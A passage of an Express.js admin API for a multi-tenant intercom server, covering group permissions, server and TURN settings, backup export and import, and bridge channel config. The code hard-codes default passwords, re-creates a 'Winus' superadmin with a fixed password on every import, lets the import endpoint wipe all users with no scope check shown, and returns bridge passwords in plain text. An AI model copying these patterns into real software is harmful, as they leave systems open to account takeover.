    return res.status(400).json({ error: 'group id / user_id requeridos' });
  }
  try {
    const g = assertGroupInScope(groupId, req.companyScope);
    const u = assertUserInScope(userId, req.companyScope);
    if (u.company_id !== g.company_id) {
      return res.status(403).json({ error: 'Usuario y grupo de empresas distintas' });
    }
    db.transaction(() => _addUserToGroupWithPerms(groupId, userId))();
  } catch (err) {
    return res.status(err.status || 500).json({ error: err.message });
  }
  res.json({ ok: true });
});

// DELETE /api/admin/groups/:id/members/:userId
router.delete('/groups/:id/members/:userId', (req, res) => {
  const groupId = parseInt(req.params.id, 10);
  const userId = parseInt(req.params.userId, 10);
  if (!Number.isFinite(groupId) || !Number.isFinite(userId)) {
    return res.status(400).json({ error: 'group id / user id requeridos' });
  }
  try {
    assertGroupInScope(groupId, req.companyScope);
    assertUserInScope(userId, req.companyScope);
    db.transaction(() => _removeUserFromGroupWithPerms(groupId, userId))();
  } catch (err) {
    return res.status(err.status || 500).json({ error: err.message });
  }
  res.json({ ok: true });
});

// PUT /api/admin/groups/:id
router.put('/groups/:id', (req, res) => {
  const groupId = parseInt(req.params.id, 10);
  const { name, member_ids } = req.body;

  let group;
  try {
    group = assertGroupInScope(groupId, req.companyScope);
  } catch (err) {
    return res.status(err.status || 404).json({ error: err.message });
  }

  try {
    if (name) {
      db.prepare('UPDATE groups SET name = ? WHERE id = ?').run(name, groupId);
    }

    if (member_ids !== undefined) {
      const oldIds = new Set(
        db.prepare('SELECT user_id FROM group_members WHERE group_id = ?')
          .all(groupId).map(r => r.user_id)
      );
      const newIds = new Set(
        member_ids.map(x => parseInt(x, 10)).filter(Number.isFinite)
      );
      const toAdd = [...newIds].filter(id => !oldIds.has(id));
      const toRemove = [...oldIds].filter(id => !newIds.has(id));
      db.transaction(() => {
        for (const uid of toRemove) _removeUserFromGroupWithPerms(groupId, uid);
        for (const uid of toAdd) {
          const u = assertUserInScope(uid, req.companyScope);
          if (u.company_id !== group.company_id) {
            const err = new Error('Miembro de otra empresa');
            err.status = 403;
            throw err;
          }
          _addUserToGroupWithPerms(groupId, uid);
        }
      })();
    }
  } catch (err) {
    if (err.message && err.message.includes('UNIQUE')) {
      return res.status(409).json({ error: 'El grupo ya existe en esta empresa' });
    }
    return res.status(err.status || 500).json({ error: err.message });
  }

  const updated = db.prepare('SELECT * FROM groups WHERE id = ?').get(groupId);
  const members = db.prepare(
    'SELECT u.id, u.username, u.display_name FROM group_members gm JOIN users u ON gm.user_id = u.id WHERE gm.group_id = ?'
  ).all(groupId);

  res.json({ ...updated, members });
});

// DELETE /api/admin/groups/:id
router.delete('/groups/:id', (req, res) => {
  const groupId = parseInt(req.params.id, 10);

  try {
    assertGroupInScope(groupId, req.companyScope);
  } catch (err) {
    return res.status(err.status || 404).json({ error: err.message });
  }

  db.transaction(() => {
    const memberIds = db.prepare(
      'SELECT user_id FROM group_members WHERE group_id = ?'
    ).all(groupId).map(r => r.user_id);
    for (const uid of memberIds) {
      _removeUserFromGroupWithPerms(groupId, uid);
    }
    db.prepare('DELETE FROM groups WHERE id = ?').run(groupId);
  })();
  res.json({ ok: true });
});

// ======================== GROUP PERMISSIONS ========================

// GET /api/admin/group-permissions
router.get('/group-permissions', (req, res) => {
  const scope = req.companyScope;
  let perms;
  if (scope.isGlobal) {
    perms = db.prepare(
      'SELECT from_user_id, to_group_id, can_talk FROM group_permissions'
    ).all();
  } else {
    perms = db.prepare(`
      SELECT gp.from_user_id, gp.to_group_id, gp.can_talk
        FROM group_permissions gp
        JOIN users u ON u.id = gp.from_user_id
        JOIN groups g ON g.id = gp.to_group_id
       WHERE u.company_id = ? AND g.company_id = ?
    `).all(scope.companyId, scope.companyId);
  }
  res.json(perms);
});

// POST /api/admin/group-permissions
router.post('/group-permissions', (req, res) => {
  const { from_user_id, to_group_id, can_talk } = req.body;

  try {
    const u = assertUserInScope(from_user_id, req.companyScope);
    const g = assertGroupInScope(to_group_id, req.companyScope);
    if (u.company_id != null && g.company_id != null && u.company_id !== g.company_id) {
      return res.status(403).json({ error: 'Usuario y grupo de empresas distintas' });
    }
  } catch (err) {
    return res.status(err.status || 403).json({ error: err.message });
  }

  db.prepare(`
    INSERT INTO group_permissions (from_user_id, to_group_id, can_talk)
    VALUES (?, ?, ?)
    ON CONFLICT(from_user_id, to_group_id) DO UPDATE SET can_talk = excluded.can_talk
  `).run(from_user_id, to_group_id, can_talk ? 1 : 0);

  // Auto-add as group member when granting permission
  if (can_talk) {
    db.prepare('INSERT OR IGNORE INTO group_members (group_id, user_id) VALUES (?, ?)')
      .run(to_group_id, from_user_id);
  }

  res.json({ ok: true });
});

// POST /api/admin/group-permissions/bulk
router.post('/group-permissions/bulk', (req, res) => {
  const { permissions } = req.body;
  const scope = req.companyScope;

  const stmt = db.prepare(`
    INSERT INTO group_permissions (from_user_id, to_group_id, can_talk)
    VALUES (?, ?, ?)
    ON CONFLICT(from_user_id, to_group_id) DO UPDATE SET can_talk = excluded.can_talk
  `);

  try {
    const transaction = db.transaction((perms) => {
      for (const p of perms || []) {
        const u = assertUserInScope(p.from_user_id, scope);
        const g = assertGroupInScope(p.to_group_id, scope);
        if (u.company_id != null && g.company_id != null && u.company_id !== g.company_id) {
          const err = new Error('Usuario y grupo de empresas distintas');
          err.status = 403;
          throw err;
        }
        stmt.run(p.from_user_id, p.to_group_id, p.can_talk ? 1 : 0);
      }
    });
    transaction(permissions || []);
  } catch (err) {
    return res.status(err.status || 500).json({ error: err.message });
  }
  res.json({ ok: true });
});

// ======================== SERVER CONFIG ========================

// GET /api/admin/server-config
router.get('/server-config', (req, res) => {
  res.json({
    announced_ips:  getConfig('announced_ips', process.env.MEDIASOUP_ANNOUNCED_IPS || ''),
    turn_host:      getConfig('turn_host', ''),
    turn_port:      getConfig('turn_port', process.env.TURN_PORT || '3478'),
    turn_user:      getConfig('turn_user', process.env.TURN_USER || 'intercom'),
    turn_password:  getConfig('turn_password', process.env.TURN_PASSWORD || 'intercom2024'),
    public_domain:  getConfig('public_domain', process.env.PUBLIC_DOMAIN || ''),
    https_port:     getConfig('https_port', process.env.HTTPS_PORT || '8443'),
    http_port:      getConfig('http_port', process.env.HTTP_PORT || '8080'),
    user_ring_enabled: getConfig('user_ring_enabled', '0') === '1',
    // Surface the last infra-sync failure (if any) so the UI can
    // show a banner. Cleared on the next successful sync.
    last_sync_error: getConfig('last_sync_error', ''),
  });
});

// PUT /api/admin/server-config
//
// Persists the keys to the BD (mediasoup re-reads them in caliente from
// signaling.js) AND, when any of `announced_ips`, `turn_host` or
// `public_domain` changes, asks infra-sync to:
//   1. rewrite the IP-related keys in /app/.env
//   2. regenerate the self-signed cert with the new SAN list (if domain
//      or external IP changed)
//   3. recreate the coturn (and optionally nginx) container so the new
//      env / cert is actually applied.
//
// The sync runs in the background — the response returns as soon as the
// BD write is durable, with a `sync` field describing what was queued.
router.put('/server-config', (req, res) => {
  // user_ring_enabled is a simple boolean toggle — handle separately
  // before the infra-sync logic.
  if (req.body.user_ring_enabled !== undefined) {
    setConfig('user_ring_enabled', req.body.user_ring_enabled ? '1' : '0');
  }

  const fields = [
    'announced_ips',
    'turn_host',
    'turn_port',
    'turn_user',
    'turn_password',
    'public_domain',
    'https_port',
    'http_port',
  ];

  // Snapshot the current values BEFORE applying updates so we can decide
  // whether infra-sync needs to run.
  const before = {
    announced_ips: getConfig('announced_ips', ''),
    turn_host:     getConfig('turn_host', ''),
    turn_port:     getConfig('turn_port', process.env.TURN_PORT || '3478'),
    public_domain: getConfig('public_domain', ''),
    https_port:    getConfig('https_port', process.env.HTTPS_PORT || '8443'),
    http_port:     getConfig('http_port', process.env.HTTP_PORT || '8080'),
  };

  for (const field of fields) {
    if (req.body[field] !== undefined) {
      setConfig(field, req.body[field]);
    }
  }

  const after = {
    announced_ips: getConfig('announced_ips', ''),
    turn_host:     getConfig('turn_host', ''),
    turn_port:     getConfig('turn_port', process.env.TURN_PORT || '3478'),
    public_domain: getConfig('public_domain', ''),
    https_port:    getConfig('https_port', process.env.HTTPS_PORT || '8443'),
    http_port:     getConfig('http_port', process.env.HTTP_PORT || '8080'),
  };

  const ipsChanged    = before.announced_ips !== after.announced_ips;
  const turnChanged   = before.turn_host !== after.turn_host;
  const portChanged   = before.turn_port !== after.turn_port;
  const domainChanged = before.public_domain !== after.public_domain;
  const httpChanged   = before.https_port !== after.https_port || before.http_port !== after.http_port;

  if (!ipsChanged && !turnChanged && !portChanged && !domainChanged && !httpChanged) {
    return res.json({ ok: true, sync: { coturn: 'skipped', nginx: 'skipped' } });
  }

  // Compute the values that must land in .env. Coturn rejects hostnames
  // in --external-ip, so resolve `turn_host` to its first A record. If
  // turn_host is empty fall back to the first announced_ip.
  const firstAnnounced = (after.announced_ips || '')
    .split(',').map((s) => s.trim()).filter(Boolean)[0] || '';
  const externalSource = after.turn_host || firstAnnounced;

  // Heavy lifting goes to a background task; client doesn't wait.
  (async () => {
    try {
      const externalIp = await resolveHostToIp(externalSource);
      const localIp = pickPrivateIp(after.announced_ips) || externalIp;

      const envUpdate = {
        EXTERNAL_IP: externalIp,
        LOCAL_IP: localIp,
        MEDIASOUP_ANNOUNCED_IPS: after.announced_ips,
        PUBLIC_DOMAIN: after.public_domain || '',
      };
      if (portChanged) envUpdate.TURN_PORT = after.turn_port;
      if (httpChanged) {
        envUpdate.HTTPS_PORT = after.https_port;
        envUpdate.HTTP_PORT = after.http_port;
      }
      const envResult = await writeEnv(envUpdate);

      const containers = [];
      if (ipsChanged || turnChanged || portChanged) containers.push('coturn');

      let certResult = { ok: true, skipped: true };
      if (domainChanged || ipsChanged || turnChanged || portChanged) {
        certResult = await regenerateCerts({
          externalIp,
          localIp,
          publicDomain: after.public_domain || '',
        });
      }

      // Only recreate coturn from infra-sync. Nginx cannot be recreated
      // from inside the backend container because Docker bind-mounts
      // resolve relative to /app/ (inside the container) instead of
      // /opt/winus-intercom/ (on the host), causing cert/web files to
      // be missing. Nginx must be restarted from the host.
      const dockerResult = await recreateContainers(containers);

      const warnings = [];
      if (envResult && !envResult.ok) warnings.push(envResult.reason || 'env write failed');
      if (certResult && !certResult.ok) warnings.push(certResult.reason || 'cert regen failed');
      if (dockerResult && !dockerResult.ok) warnings.push(dockerResult.reason || 'docker failed');
      const needsNginxRestart = httpChanged || domainChanged ||
        (certResult.ok && !certResult.skipped);
      if (needsNginxRestart) {
        warnings.push('Nginx needs manual restart: docker compose up -d --force-recreate nginx');
      }
      setConfig('last_sync_error', warnings.join(' | '));
      console.log('[server-config] sync done',
        { externalIp, localIp, containers, needsNginxRestart, errors: warnings.join(' | ') || 'none' });
    } catch (e) {
      console.error('[server-config] sync threw', e);
      setConfig('last_sync_error', e.message || String(e));
    }
  })();

  res.json({
    ok: true,
    sync: {
      coturn: ipsChanged || turnChanged || portChanged ? 'queued' : 'skipped',
      nginx:  (domainChanged || httpChanged || ipsChanged) ? 'manual_restart_needed' : 'skipped',
    },
  });
});

// POST /api/admin/server-config/clear-sync-error
// Lets the admin UI dismiss a stale `last_sync_error` banner.
router.post('/server-config/clear-sync-error', (req, res) => {
  setConfig('last_sync_error', '');
  res.json({ ok: true });
});

// ======================== EXPORT / IMPORT CONFIG ========================

// GET /api/admin/export-config — full backup (global for superadmin; company-scoped otherwise)
router.get('/export-config', (req, res) => {
  const scope = req.companyScope;
  const companies = isSuperadmin(scope.caller)
    ? db.prepare('SELECT id, name, slug, active FROM companies ORDER BY id').all()
    : db.prepare('SELECT id, name, slug, active FROM companies WHERE id = ?').all(scope.companyId);

  const users = scope.isGlobal
    ? db.prepare(
        'SELECT id, username, display_name, role, room_id, color, company_id FROM users WHERE id != ? ORDER BY id'
      ).all(WINUS_ID)
    : db.prepare(
        'SELECT id, username, display_name, role, room_id, color, company_id FROM users WHERE company_id = ? ORDER BY id'
      ).all(scope.companyId);

  const groups = scope.isGlobal
    ? db.prepare('SELECT id, name, company_id FROM groups ORDER BY id').all()
    : db.prepare('SELECT id, name, company_id FROM groups WHERE company_id = ? ORDER BY id').all(scope.companyId);

  const userIdSet = new Set(users.map((u) => u.id));
  const groupIdSet = new Set(groups.map((g) => g.id));

  const members = db.prepare('SELECT group_id, user_id FROM group_members').all()
    .filter((m) => groupIdSet.has(m.group_id) && userIdSet.has(m.user_id));
  const permissions = db.prepare('SELECT from_user_id, to_user_id, can_talk FROM permissions').all()
    .filter((p) => userIdSet.has(p.from_user_id) && userIdSet.has(p.to_user_id));
  const groupPerms = db.prepare('SELECT from_user_id, to_group_id, can_talk FROM group_permissions').all()
    .filter((p) => userIdSet.has(p.from_user_id) && groupIdSet.has(p.to_group_id));

  const serverConfig = {};
  // Server config is global infrastructure — only superadmin exports it.
  if (isSuperadmin(scope.caller)) {
    for (const row of db.prepare('SELECT key, value FROM server_config').all()) {
      serverConfig[row.key] = row.value;
    }
  }

  res.json({
    version: 2,
    exported_at: new Date().toISOString(),
    companies,
    users,
    groups,
    group_members: members,
    permissions,
    group_permissions: groupPerms,
    server_config: serverConfig,
  });
});

// POST /api/admin/import-config — restore from backup
router.post('/import-config', (req, res) => {
  const data = req.body;
  if (!data || !data.users || !data.groups) {
    return res.status(400).json({ error: 'Invalid config format' });
  }

  try {
    const bcrypt = require('bcryptjs');
    const defaultHash = bcrypt.hashSync('1234', 10);

    db.transaction(() => {
      // Clear existing data (order matters for FK constraints)
      db.exec('DELETE FROM group_permissions');
      db.exec('DELETE FROM permissions');
      db.exec('DELETE FROM group_members');
      db.exec('DELETE FROM groups');
      db.exec('DELETE FROM users');

// Ensure Default company exists; import companies if provided (v2).
      const ensureCo = db.prepare(
        'INSERT OR IGNORE INTO companies (id, name, slug, active) VALUES (?, ?, ?, ?)'
      );
      ensureCo.run(1, 'Default', 'default', 1);
      if (Array.isArray(data.companies)) {
        for (const c of data.companies) {
          if (!c.id || !c.name) continue;
          ensureCo.run(c.id, c.name, c.slug || null, c.active === 0 ? 0 : 1);
        }
      }

      // Import users. Use bcrypt hash from the JSON password field if
      // present (excel-to-json exports a plaintext password); otherwise
      // fall back to the default '1234' hash.
      const insertUser = db.prepare(
        'INSERT INTO users (id, username, password_hash, display_name, role, room_id, color, company_id) VALUES (?, ?, ?, ?, ?, ?, ?, ?)'
      );
      for (const u of data.users) {
        if (!u.username) {
          console.warn(`[Admin] Import: skipping user id=${u.id} — no username`);
          continue;
        }
        if (u.role === 'superadmin' || u.id === WINUS_ID) continue;
        const hash = u.password ? bcrypt.hashSync(u.password, 10) : defaultHash;
        insertUser.run(
          u.id,
          u.username,
          hash,
          u.display_name || u.username,
          u.role || 'user',
          u.room_id ?? u.id,
          u.color || null,
          u.company_id || 1,
        );
      }

      // Import groups
      const insertGroup = db.prepare('INSERT INTO groups (id, name, company_id) VALUES (?, ?, ?)');
      for (const g of data.groups) {
        insertGroup.run(g.id, g.name, g.company_id || 1);
      }

      // Import group members
      if (data.group_members) {
        const insertMember = db.prepare('INSERT OR IGNORE INTO group_members (group_id, user_id) VALUES (?, ?)');
        for (const m of data.group_members) {
          insertMember.run(m.group_id, m.user_id);
        }
      }

      // Import permissions
      if (data.permissions) {
        const insertPerm = db.prepare(
          'INSERT OR IGNORE INTO permissions (from_user_id, to_user_id, can_talk) VALUES (?, ?, ?)'
        );
        for (const p of data.permissions) {
          insertPerm.run(p.from_user_id, p.to_user_id, p.can_talk ? 1 : 0);
        }
      }

      // Import group permissions
      if (data.group_permissions) {
        const insertGP = db.prepare(
          'INSERT OR IGNORE INTO group_permissions (from_user_id, to_group_id, can_talk) VALUES (?, ?, ?)'
        );
        for (const p of data.group_permissions) {
          insertGP.run(p.from_user_id, p.to_group_id, p.can_talk ? 1 : 0);
        }
      }

// Import server config (superadmin only payload usually)
      if (data.server_config && isSuperadmin(req.companyScope.caller)) {
        const upsertConfig = db.prepare(
          'INSERT INTO server_config (key, value) VALUES (?, ?) ON CONFLICT(key) DO UPDATE SET value = excluded.value'
        );
        for (const [key, value] of Object.entries(data.server_config)) {
          upsertConfig.run(key, value);
        }
      }

      // Always restore Winus superadmin after full wipe.
      const winusHash = bcrypt.hashSync('Winus2026', 10);
      db.prepare(
        'INSERT OR REPLACE INTO users (id, username, password_hash, display_name, role, room_id, company_id) VALUES (?, ?, ?, ?, ?, ?, ?)'
      ).run(WINUS_ID, 'Winus', winusHash, 'Winus Maintenance', 'superadmin',
            config.roomIdOffset + WINUS_ID, null);
    })();

    console.log(`[Admin] Config imported: ${data.users.length} users, ${data.groups.length} groups`);
    res.json({ ok: true, users: data.users.length, groups: data.groups.length });
  } catch (err) {
    console.error('[Admin] Import error:', err.message);
    res.status(500).json({ error: err.message });
  }
});

// ======================== BRIDGE CONFIG ========================

// GET /api/admin/bridge-config — generate TieLine bridge config.json
router.get('/bridge-config', (req, res) => {
  const scope = req.companyScope;
  const bridgeUsers = scope.isGlobal
    ? db.prepare(
        "SELECT id, username, display_name, company_id FROM users WHERE role = 'bridge' ORDER BY id"
      ).all()
    : db.prepare(
        "SELECT id, username, display_name, company_id FROM users WHERE role = 'bridge' AND company_id = ? ORDER BY id"
      ).all(scope.companyId);

  // Get saved channel mappings (target per bridge user)
  const savedRaw = getConfig('bridge_channels', '{}');
  let saved = {};
  try { saved = JSON.parse(savedRaw); } catch (_) {}

  // Resolve company names for bridge GUI legends (MTX → user → empresa)
  const companyNameById = {};
  try {
    for (const row of db.prepare('SELECT id, name FROM companies').all()) {
      companyNameById[row.id] = row.name;
    }
  } catch (_) { /* ignore */ }

  const channels = bridgeUsers.map((u, idx) => {
    const ch = saved[String(u.id)] || {};
    const companyId = u.company_id ?? ch.company_id ?? null;
    return {
      index: idx + 1,
      user_id: u.id,
      username: u.username,
      display_name: u.display_name,
      company_id: companyId,
      company_name: companyId != null ? (companyNameById[companyId] || null) : null,
      password: ch.password || '1234',
      target_type: ch.target_type || 'user',
      target_id: ch.target_id || 0,
      input_device: ch.input_device || '',
      input_channel: ch.input_channel || idx + 1,
      output_device: ch.output_device || '',
      output_channel: ch.output_channel || idx + 1,
      vox_send_enabled: ch.vox_send_enabled ?? false,
      vox_send_threshold_db: ch.vox_send_threshold_db ?? -40,
      vox_send_hold_ms: ch.vox_send_hold_ms ?? 300,
      vox_recv_enabled: ch.vox_recv_enabled ?? true,
      vox_recv_threshold_db: ch.vox_recv_threshold_db ?? -40,
      vox_recv_hold_ms: ch.vox_recv_hold_ms ?? 300,
    };
  });

  res.json({
    server: `https://${req.headers.host || 'localhost:8443'}`,
    channels,
  });
});

// PUT /api/admin/bridge-config — save bridge channel mappings
router.put('/bridge-config', (req, res) => {
  const { channels } = req.body;
  if (!channels || !Array.isArray(channels)) {
    return res.status(400).json({ error: 'channels array required' });
  }

  // Store as { "userId": { password, target_type, target_id, ... } }
  const saved = {};
  for (const ch of channels) {
    saved[String(ch.user_id)] = {
      password: ch.password,
      company_id: ch.company_id ?? null,
      target_type: ch.target_type,
      target_id: ch.target_id,
      input_device: ch.input_device,
      input_channel: ch.input_channel,
      output_device: ch.output_device,
      output_channel: ch.output_channel,
      vox_send_enabled: ch.vox_send_enabled,
      vox_send_threshold_db: ch.vox_send_threshold_db,
      vox_send_hold_ms: ch.vox_send_hold_ms,
      vox_recv_enabled: ch.vox_recv_enabled,
      vox_recv_threshold_db: ch.vox_recv_threshold_db,
      vox_recv_hold_ms: ch.vox_recv_hold_ms,
    };
  }
  setConfig('bridge_channels', JSON.stringify(saved));
  res.json({ ok: true });
});

module.exports = router;
